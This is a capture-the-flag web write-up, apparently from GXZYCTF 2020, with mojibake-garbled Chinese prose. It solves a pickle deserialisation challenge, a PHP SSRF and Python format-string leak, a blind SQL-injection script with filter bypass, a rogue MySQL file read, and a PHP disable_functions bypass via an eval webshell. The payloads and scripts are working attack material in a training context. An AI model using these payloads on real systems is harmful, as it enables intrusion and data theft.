<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="constructor">Flask(<span class="params">__name__</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Animal:</span><br><span class="line">    def <span class="constructor">__init__(<span class="params">self</span>, <span class="params">name</span>, <span class="params">category</span>)</span>:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__repr__(<span class="params">self</span>)</span>:</span><br><span class="line">        return f'<span class="constructor">Animal(<span class="params">name</span>=&#123;<span class="params">self</span>.<span class="params">name</span>!<span class="params">r</span>&#125;, <span class="params">category</span>=&#123;<span class="params">self</span>.<span class="params">category</span>!<span class="params">r</span>&#125;)</span>'</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__eq__(<span class="params">self</span>, <span class="params">other</span>)</span>:</span><br><span class="line">        return <span class="keyword">type</span>(other) is Animal <span class="keyword">and</span> self.name<span class="operator"> == </span>other.name <span class="keyword">and</span> self.category<span class="operator"> == </span>other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="constructor">RestrictedUnpickler(<span class="params">pickle</span>.Unpickler)</span>:</span><br><span class="line">    def find<span class="constructor">_class(<span class="params">self</span>, <span class="params">module</span>, <span class="params">name</span>)</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">module</span><span class="operator"> == </span>'__main__':</span><br><span class="line">            return getattr(sys.modules<span class="literal">['<span class="identifier">__main__</span>']</span>, name)</span><br><span class="line">        raise pickle.<span class="constructor">UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (<span class="params">module</span>, <span class="params">name</span>)</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted<span class="constructor">_loads(<span class="params">s</span>)</span>:</span><br><span class="line">    return <span class="constructor">RestrictedUnpickler(<span class="params">io</span>.BytesIO(<span class="params">s</span>)</span>).load<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(filename, encoding='utf-<span class="number">8</span>'):</span><br><span class="line">    <span class="keyword">with</span> <span class="keyword">open</span>(filename, <span class="character">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        return fin.read<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="character">'/'</span>, methods=<span class="literal">['GET', 'POST']</span>)</span><br><span class="line">def index<span class="literal">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.args.get('source'):</span><br><span class="line">        return <span class="constructor">Response(<span class="params">read</span>(<span class="params">__file__</span>)</span>, mimetype='text/plain')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get('data')</span><br><span class="line">            <span class="keyword">if</span> b<span class="character">'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters <span class="keyword">or</span> RCEs.'</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted<span class="constructor">_loads(<span class="params">base64</span>.<span class="params">b64decode</span>(<span class="params">pickle_data</span>)</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">type</span>(result) is not Animal:</span><br><span class="line">                    return 'Are you sure that is an animal???'</span><br><span class="line">            correct = (result<span class="operator"> == </span><span class="constructor">Animal(<span class="params">secret</span>.<span class="params">name</span>, <span class="params">secret</span>.<span class="params">category</span>)</span>)</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">unpickle_result</span>.<span class="params">html</span>', <span class="params">result</span>=<span class="params">result</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>, <span class="params">giveflag</span>=<span class="params">correct</span>)</span></span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            return <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = <span class="constructor">Animal('ä¸€ç»™æˆ‘å“©<span class="params">giaogiao</span>', 'Giao')</span></span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode<span class="literal">()</span></span><br><span class="line">    return render<span class="constructor">_template('<span class="params">unpickle_page</span>.<span class="params">html</span>', <span class="params">sample_obj</span>=<span class="params">sample_obj</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__<span class="operator"> == </span>'__main__':</span><br><span class="line">    app.run(host='<span class="number">0.0</span>.<span class="number">0.0</span>', port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾ä¸€é“pythonååºåˆ—åŒ–çš„é¢˜ï¼Œä¸è¿‡<code>if b&#39;R&#39; in base64.b64decode(pickle_data)</code>æ–­äº†ç›´æ¥åå¼¹shellå’Œè°ƒç”¨render_templateå‡½æ•°çš„æ“ä½œï¼Œæ‰€ä»¥è¯´å°±æ˜¯åªèƒ½ç»™secret.nameã€secret.categoryå˜é‡èµ‹å€¼ï¼Œè¦æ±‚typeä¸ºAnimalï¼ŒåŒæ—¶secretåˆè¦é‡mainå¯åŠ¨ï¼Œæ‰€ä»¥éœ€è¦é‡å†™ä¸€ä¸‹secretç±»ã€‚å‚è€ƒ<a href="https://blog.init-new-world.com/post/hitctf-train.htmlï¼ˆä¹Ÿå°±æ˜¯åŸé¢˜ï¼‰" target="_blank" rel="noopener">https://blog.init-new-world.com/post/hitctf-train.htmlï¼ˆä¹Ÿå°±æ˜¯åŸé¢˜ï¼‰</a></p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309103404408.png" alt></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   2020-03-07 14:51:06</span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b"<span class="symbol">\x</span>80<span class="symbol">\x</span>03c__main__<span class="symbol">\n</span>secret<span class="symbol">\n</span>&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub0c__main__<span class="symbol">\n</span>Animal<span class="symbol">\n</span>)<span class="symbol">\x</span>81&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub."</span><br><span class="line">print(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>



<h3 id="0x01-fmkq"><a href="#0x01-fmkq" class="headerlink" title="0x01 fmkq"></a>0x01 fmkq</h3><p>è®¿é—®ç›´æ¥ç»™äº†é¢˜ç›®æºç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å…³é”®å°±æ˜¯è§¦å‘curläº†ï¼Œå‚è€ƒ<a href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> é€šè¿‡extractè¿›è¡Œå˜é‡è¦†ç›–ï¼Œè¦†ç›–beginä¸ºbegin=%1$sï¼Œåˆ™<code>sprintf($begin.&#39;%d&#39;,$output);</code>å¤„å°±å¯ä»¥è¾“å‡ºï¼Œä¾‹å¦‚æ„é€ </p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure>

<p>åˆ™å¯ä»¥è¿”å›baiduçš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¾ç„¶ç”¨æ¥SSRFæœ€åˆé€‚ä¸è¿‡ï¼Œå‘ç°127.0.0.1è¿˜å¼€äº†8080ç«¯å£ï¼Œæ‰€ä»¥æ„é€ </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309104345436.png" alt></p>
<p>ä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬æ‹¿åˆ°vipcodeï¼Œä¸€é€šæµ‹è¯•ï¼Œpythonçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é—®é¢˜ï¼Œæ„é€ </p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¯»å–åˆ°vipcode</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105152178.png" alt></p>
<p>å¸¦ä¸Švipcodeå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105248654.png" alt></p>
<p>æç¤ºäº†flagæ‰€åœ¨çš„æ–‡ä»¶ï¼Œç»“åˆé¢˜ç›®æç¤ºï¼Œflagçš„è·¯å¾„å°±æ˜¯/fl4g_1s_h3re_u_wi11_rua/flagï¼Œè¯»å–é¢˜ç›®æºç å¯ä»¥å‘ç°fl4gè¢«è¿‡æ»¤äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure>

<p>ç”±äºfl4gè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åªèƒ½å¦è¾Ÿè¹Šå¾„ï¼Œä»£ç ä¸­</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥é€šè¿‡current_folder_fileæ¥è·å–flagæ–‡ä»¶å¤¹ï¼Œæ„é€ </p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0.png" alt>            </p>
<h3 id="0x02-nweb"><a href="#0x02-nweb" class="headerlink" title="0x02 nweb"></a>0x02 nweb</h3><p>æ ¹æ®ç™»å…¥åçš„æç¤ºï¼Œç”¨æˆ·ä¼šæœ‰åˆ†çº§ï¼Œæ³¨å†Œè´¦å·çš„æ—¶å€™éšè—äº†typeå±æ€§</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722768764.png" alt>            </p>
<p>typeèµ‹å€¼ä¸º110ï¼Œç™»å½•åå¯ä»¥è®¿é—®flag.php é‡Œé¢æ˜¯ä¸€ä¸ªsearchæ¡†ï¼Œå¯ä»¥æµ‹è¯•ä¸€ä¸‹æ³¨å…¥</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722779047.png" alt="img">            </p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722789446.png" alt="img">            </p>
<p>ç®€å•æµ‹è¯•å‘ç°åªè¿‡æ»¤äº†selectå’Œfromï¼Œå¯ä»¥åŒå†™ç»•è¿‡ï¼Œæ‰€ä»¥å†™ä¸€ä¸ªè„šæœ¬è·‘å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Â encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span>Â requests</span><br><span class="line">flag=Â <span class="string">''</span></span><br><span class="line">urlÂ =Â <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">CookieÂ =Â &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxiesÂ =Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="string">"http"</span>:Â <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span>Â iÂ <span class="keyword">in</span>Â range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">Â Â Â Â highÂ =Â <span class="number">127</span></span><br><span class="line">Â Â Â Â lowÂ =Â <span class="number">32</span></span><br><span class="line">Â Â Â Â midÂ =Â (lowÂ +Â high)Â //Â <span class="number">2</span></span><br><span class="line">Â Â Â Â <span class="keyword">while</span>Â highÂ &gt;Â low:</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">#payload=r"1'Â orÂ 1=(ascii(mid(CONCAT_WS(CHAR(32,58,32),user(),database(),version()),&#123;&#125;,1))&gt;&#123;&#125;)--+"Â #65</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">#payload=r"1'Â orÂ 1=(ascii(mid((selselectectÂ group_concat(column_NAME)Â frfromomÂ information_schema.columnSÂ whereÂ table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">Â Â Â Â Â Â Â Â payload=<span class="string">r"1'Â orÂ 1=(ascii(mid((selselectectÂ pwdÂ frfromomÂ adminÂ limitÂ 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="comment">#payload=r"1'Â orÂ 1=(ascii(mid((database()),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">Â Â Â Â Â Â Â Â url_1=url+payload.format(i,mid)</span><br><span class="line">Â Â Â Â Â Â Â Â data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">Â Â Â Â Â Â Â Â r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">Â Â Â Â Â Â Â Â print(r.content)</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â <span class="string">b"isÂ flag"</span>Â <span class="keyword">in</span>Â Â r.content:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â low=mid+<span class="number">1</span>Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">else</span>:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â high=mid</span><br><span class="line">Â Â Â Â Â Â Â Â mid=(low+high)//<span class="number">2</span></span><br><span class="line">Â Â Â Â print(flag)</span><br><span class="line">Â Â Â Â flag+=chr(mid)</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“é‡Œåªæœ‰ä¸€åŠçš„flagï¼šflag{Rogue-MySql-Server- ï¼ŒåŒæ—¶è¿˜å¾—åˆ°äº†adminç”¨æˆ·çš„å¯†ç ï¼šwhoamiadmin</p>
<p>æ ¹æ®å‰åŠæ®µflagå’Œç™»å½•åçš„æç¤ºï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ mysqlæœåŠ¡ä»»æ„æ–‡ä»¶è¯»å–çš„é—®é¢˜äº†ï¼Œé€šè¿‡Rogue-MySql-Serverè„šæœ¬è®¾ç½®è¯»å–ä¸€ä¸‹flag.phpæ–‡ä»¶</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583751402598.png" alt>            </p>
<p>ä¹Ÿå°±æ‹¿åˆ°äº†flagçš„åä¸€éƒ¨åˆ†ï¼Œæ‹¼æ¥èµ·æ¥å°±å¯ä»¥äº†ã€‚</p>
<h3 id="0x03-php-uaf"><a href="#0x03-php-uaf" class="headerlink" title="0x03 php uaf"></a>0x03 php uaf</h3><p>é€åˆ†é¢˜ï¼Œè®¿é—®ç›´æ¥å¾—æºä»£ç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹phpinfoï¼Œphpç‰ˆæœ¬æ˜¯7.4.2ï¼Œè®¾ç½®äº†disable_functionå’Œopen_basedir</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309110411132.png" alt="image-20200309110411132"></p>
<p>ç›´æ¥æ‹¿<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> php7.4ç‰ˆæœ¬é€šæ€çš„expé€šé“èœåˆ€ä¼ ä¸Šå»ç›´æ¥æ‰§è¡Œ/readflagå°±è¡Œäº†</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583723134043.png" alt>            </p>
